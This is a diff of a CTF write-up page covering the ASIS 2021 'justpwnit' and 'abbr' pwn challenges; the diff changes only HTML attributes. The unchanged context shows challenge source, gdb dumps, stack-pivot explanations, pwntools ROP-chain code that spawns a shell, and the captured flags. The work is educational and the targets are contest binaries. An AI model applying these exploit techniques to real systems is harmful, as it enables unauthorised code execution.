@@ -585,7 +585,7 @@ You can find the related files <a
 </div>
 <p>justpwnit was a warmup pwn challenge. That&rsquo;s only a basic stack overflow.
 The binary is statically linked and here is the checksec&rsquo;s output:</p>
-<pre tabindex="0"><code>[*] '/home/nasm/justpwnit'
+<pre><code>[*] '/home/nasm/justpwnit'
     Arch:     amd64-64-little
     RELRO:    Partial RELRO
     Stack:    No canary found
@@ -593,7 +593,7 @@ The binary is statically linked and here is the checksec&rsquo;s output:</p>
     PIE:      No PIE (0x400000)
 </code></pre><p>Morever the source code is provided as it is the case for all the pwn tasks !
 Here it is:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="cm">/*
+<div class="highlight"><pre class="chroma"><code class="language-c" data-lang="c"><span class="cm">/*
 </span><span class="cm"> * musl-gcc main.c -o chall -no-pie -fno-stack-protector -O0 -static
 </span><span class="cm"> */</span>
 <span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
@@ -631,7 +631,7 @@ Here it is:</p>
 </code></pre></div><p>The program is basically reading <code>STR_SIZE</code> bytes into <code>parray[index]</code>, the issue is that there is no check on the user controlled index from which we choose were write the input.
 Furthermore, <code>index</code> is a signed integer, which means we can input a negative value. If we do so we will be able to overwrite the saved <code>$rbp</code> value of the <code>set_element</code> stackframe by a heap pointer to our input. By this way at the end of the pwninit, the <code>leave</code> instruction will pivot the stack from the original state to a pointer to the user input.</p>
 <p>Let&rsquo;s see this in gdb !</p>
-<pre tabindex="0"><code>00:0000│ rsp     0x7ffef03864e0 ◂— 0x0                                                                                                                                                         
+<pre><code>00:0000│ rsp     0x7ffef03864e0 ◂— 0x0                                                                                                                                                         
 01:0008│         0x7ffef03864e8 —▸ 0x7ffef0386520 ◂— 0xb4                                                                                                                                      
 02:0010│         0x7ffef03864f0 ◂— 0x0
 03:0018│         0x7ffef03864f8 ◂— 0xfffffffe00403d3f /* '?=@' */
@@ -646,7 +646,7 @@ Furthermore, <code>index</code> is a signed integer, which means we can input a 
 0f:0078│         0x7ffef0386558 —▸ 0x401295 (main+88) ◂— mov    eax, 0
 </code></pre><p>That&rsquo;s the stack&rsquo;s state when we are calling calloc. We can see the <code>set_element</code>&rsquo;s stackframe which ends up in <code>$rsp+38</code> with the saved return address. And right after we see that <code>$rax</code> contains the address of the <code>parray</code> buffer. Which means that if we send -2 as index, <code>$rbp</code> will point to the newly allocated buffer to which we will write right after with <code>fgets</code>.</p>
 <p>Then, if we do so, the stack&rsquo;s state looks like this:</p>
-<pre tabindex="0"><code>00:0000│ rsp     0x7ffef03864e0 ◂— 0x0                                                                                                                                                         
+<pre><code>00:0000│ rsp     0x7ffef03864e0 ◂— 0x0                                                                                                                                                         
 01:0008│         0x7ffef03864e8 —▸ 0x7ffef0386520 ◂— 0xb4                                                                                                                                      
 02:0010│         0x7ffef03864f0 ◂— 0x0                                                                                                                                                         
 03:0018│         0x7ffef03864f8 ◂— 0xfffffffe00403d3f /* '?=@' */                                                                                                                              
@@ -686,14 +686,14 @@ The binary is statically linked, and there is no system function in the binary, 
   >ROPgadget</a
 >.
 We got:</p>
-<pre tabindex="0"><code>0x0000000000406c32 : mov qword ptr [rax], rsi ; ret
+<pre><code>0x0000000000406c32 : mov qword ptr [rax], rsi ; ret
 0x0000000000401001 : pop rax ; ret
 0x00000000004019a3 : pop rsi ; ret
 0x00000000004013e9 : syscall
 0x0000000000403d23 : pop rdx ; ret
 0x0000000000401b0d : pop rdi ; ret
 </code></pre><p>Now we just have to craft the ropchain !</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="n">POP_RDI</span> <span class="o">=</span> <span class="mh">0x0000000000401b0d</span>
+<div class="highlight"><pre class="chroma"><code class="language-py" data-lang="py"><span class="n">POP_RDI</span> <span class="o">=</span> <span class="mh">0x0000000000401b0d</span>
 <span class="n">POP_RDX</span> <span class="o">=</span> <span class="mh">0x0000000000403d23</span>
 <span class="n">SYSCALL</span> <span class="o">=</span> <span class="mh">0x00000000004013e9</span>
 <span class="n">POP_RAX</span> <span class="o">=</span> <span class="mh">0x0000000000401001</span>
@@ -711,7 +711,7 @@ We got:</p>
 <span class="n">pld</span> <span class="o">+=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="n">POP_RDX</span><span class="p">)</span> <span class="o">+</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x0</span><span class="p">)</span>
 <span class="n">pld</span> <span class="o">+=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="n">SYSCALL</span><span class="p">)</span>
 </code></pre></div><p>And we can enjoy the shell !</p>
-<pre tabindex="0"><code>➜  justpwnit git:(master) ✗ python3 exploit.py HOST=168.119.108.148 PORT=11010
+<pre><code>➜  justpwnit git:(master) ✗ python3 exploit.py HOST=168.119.108.148 PORT=11010
 [*] '/home/nasm/pwn/asis2021/justpwnit/justpwnit'
     Arch:     amd64-64-little
     RELRO:    Partial RELRO
@@ -735,7 +735,7 @@ ASIS{p01nt_RSP_2_h34p!_RHP_1n5t34d_0f_RSP?}
         </a>
     </h2>
 </div>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="ch">#!/usr/bin/env python</span>
+<div class="highlight"><pre class="chroma"><code class="language-py" data-lang="py"><span class="ch">#!/usr/bin/env python</span>
 <span class="c1"># -*- coding: utf-8 -*-</span>
 
 <span class="c1"># this exploit was generated via</span>
@@ -749,8 +749,8 @@ ASIS{p01nt_RSP_2_h34p!_RHP_1n5t34d_0f_RSP?}
 
 <span class="c1"># Set up pwntools for the correct architecture</span>
 <span class="n">exe</span>  <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">context</span><span class="o">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;justpwnit&#39;</span><span class="p">)</span>
-<span class="n">pwn</span><span class="o">.</span><span class="n">context</span><span class="o">.</span><span class="n">delete_corefiles</span> <span class="o">=</span> <span class="kc">True</span>
-<span class="n">pwn</span><span class="o">.</span><span class="n">context</span><span class="o">.</span><span class="n">rename_corefiles</span> <span class="o">=</span> <span class="kc">False</span>
+<span class="n">pwn</span><span class="o">.</span><span class="n">context</span><span class="o">.</span><span class="n">delete_corefiles</span> <span class="o">=</span> <span class="bp">True</span>
+<span class="n">pwn</span><span class="o">.</span><span class="n">context</span><span class="o">.</span><span class="n">rename_corefiles</span> <span class="o">=</span> <span class="bp">False</span>
 
 <span class="n">host</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">HOST</span>
 <span class="n">port</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">pwn</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">PORT</span> <span class="ow">or</span> <span class="mi">1337</span><span class="p">)</span>
@@ -828,7 +828,7 @@ ASIS{p01nt_RSP_2_h34p!_RHP_1n5t34d_0f_RSP?}
 </div>
 <p>abbr is very basic heap overflow, we just have to overwrite a function pointer to a stack pivot gadget with the help of a user controlled register. Then, we can drop a shell with a similar ROP as for the <code>justpwnit</code> challenge (the binary is also statically linked without the system function).</p>
 <p>Here is the source code:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
+<div class="highlight"><pre class="chroma"><code class="language-c" data-lang="c"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
 </span><span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
 </span><span class="cp">#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
 </span><span class="cp">#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
@@ -910,7 +910,7 @@ ASIS{p01nt_RSP_2_h34p!_RHP_1n5t34d_0f_RSP?}
   <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
 <span class="p">}</span>
 </code></pre></div><p>The <code>rules.h</code> looks like this:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="k">typedef</span> <span class="k">struct</span> <span class="p">{</span>
+<div class="highlight"><pre class="chroma"><code class="language-c" data-lang="c"><span class="k">typedef</span> <span class="k">struct</span> <span class="p">{</span>
   <span class="kt">char</span> <span class="o">*</span><span class="n">a</span><span class="p">;</span> <span class="c1">// abbreviated string (i.e &#34;asap&#34;)
 </span><span class="c1"></span>  <span class="kt">char</span> <span class="o">*</span><span class="n">b</span><span class="p">;</span> <span class="c1">// expanded string (i.e &#34;as soon as possible&#34;)
 </span><span class="c1"></span><span class="p">}</span> <span class="n">Rule</span><span class="p">;</span>
@@ -995,7 +995,7 @@ So we send <code>b&quot;wwwwww&quot; + b&quot;A&quot;*(0x1000-16) + pwn.p64(gadg
 </div>
 <p>Once that&rsquo;s done, when the function pointer will be triggered at the next iteration, we will be able to jmp at an arbitrary location.
 Lets take a look at the values of the registers when we trigger the function pointer:</p>
-<pre tabindex="0"><code> RAX  0x1ee8bc0 —▸ 0x4018da (init_cacheinfo+234) ◂— pop    rdi
+<pre><code> RAX  0x1ee8bc0 —▸ 0x4018da (init_cacheinfo+234) ◂— pop    rdi
  RBX  0x400530 (_IO_getdelim.cold+29) ◂— 0x0
  RCX  0x459e62 (read+18) ◂— cmp    rax, -0x1000 /* 'H=' */
 *RDX  0x405121 (_nl_load_domain+737) ◂— xchg   eax, esp
@@ -1015,7 +1015,7 @@ Lets take a look at the values of the registers when we trigger the function poi
 </code></pre><p><code>$rax</code> points to the newly readen input, same for <code>$r8</code> and <code>$rdi</code> and <code>$rdx</code> contains the location to which we will jmp on.
 So we can search gadgets like <code>mov rsp, rax</code>, <code>mov rsp, rdi</code>, <code>mov rsp, r8</code> and so on. But I didn&rsquo;t find any gadgets like that, so I looked for <code>xchg rsp</code> gadgets, and I finally found a <code>xchg eax, esp</code> gadgets ! Since the binary is not PIE based, the heap addresses fit into a 32 bits register, so that&rsquo;s perfect!</p>
 <p>Now we can make <code>$rsp</code> to point to the user input, we make a similar ropchain as the last challenge, and that&rsquo;s enough to get a shell!</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py">
+<div class="highlight"><pre class="chroma"><code class="language-py" data-lang="py">
 <span class="c1"># 0x00000000004126e3 : call qword ptr [rax]</span>
 <span class="c1"># 0x0000000000485fd2 : xchg eax, ebp ; ret</span>
 <span class="c1"># 0x0000000000405121 : xchg eax, esp ; ret</span>
@@ -1051,7 +1051,7 @@ So we can search gadgets like <code>mov rsp, rax</code>, <code>mov rsp, rdi</cod
 <span class="n">pld</span> <span class="o">+=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x3b</span><span class="p">)</span>
 <span class="n">pld</span> <span class="o">+=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="n">SYSCALL</span><span class="p">)</span>
 </code></pre></div><p>We launch the script with the right arguments and we correctly pop a shell!</p>
-<pre tabindex="0"><code>➜  abbr.d git:(master) ✗ python3 exploit.py HOST=168.119.108.148 PORT=10010 
+<pre><code>➜  abbr.d git:(master) ✗ python3 exploit.py HOST=168.119.108.148 PORT=10010 
 [*] '/home/nasm/pwn/asis2021/abbr.d/abbr'
     Arch:     amd64-64-little
     RELRO:    Partial RELRO
@@ -1077,7 +1077,7 @@ ASIS{d1d_u_kn0w_ASIS_1s_n0t_4n_4bbr3v14t10n}
         </a>
     </h2>
 </div>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="ch">#!/usr/bin/env python</span>
+<div class="highlight"><pre class="chroma"><code class="language-py" data-lang="py"><span class="ch">#!/usr/bin/env python</span>
 <span class="c1"># -*- coding: utf-8 -*-</span>
 
 <span class="c1"># this exploit was generated via</span>
@@ -1091,8 +1091,8 @@ ASIS{d1d_u_kn0w_ASIS_1s_n0t_4n_4bbr3v14t10n}
 
 <span class="c1"># Set up pwntools for the correct architecture</span>
 <span class="n">exe</span>  <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">context</span><span class="o">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;abbr&#39;</span><span class="p">)</span>
-<span class="n">pwn</span><span class="o">.</span><span class="n">context</span><span class="o">.</span><span class="n">delete_corefiles</span> <span class="o">=</span> <span class="kc">True</span>
-<span class="n">pwn</span><span class="o">.</span><span class="n">context</span><span class="o">.</span><span class="n">rename_corefiles</span> <span class="o">=</span> <span class="kc">False</span>
+<span class="n">pwn</span><span class="o">.</span><span class="n">context</span><span class="o">.</span><span class="n">delete_corefiles</span> <span class="o">=</span> <span class="bp">True</span>
+<span class="n">pwn</span><span class="o">.</span><span class="n">context</span><span class="o">.</span><span class="n">rename_corefiles</span> <span class="o">=</span> <span class="bp">False</span>
 
 <span class="n">host</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">HOST</span> <span class="ow">or</span> <span class="s1">&#39;127.0.0.1&#39;</span>
 <span class="n">port</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">pwn</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">PORT</span> <span class="ow">or</span> <span class="mi">1337</span><span class="p">)</span>
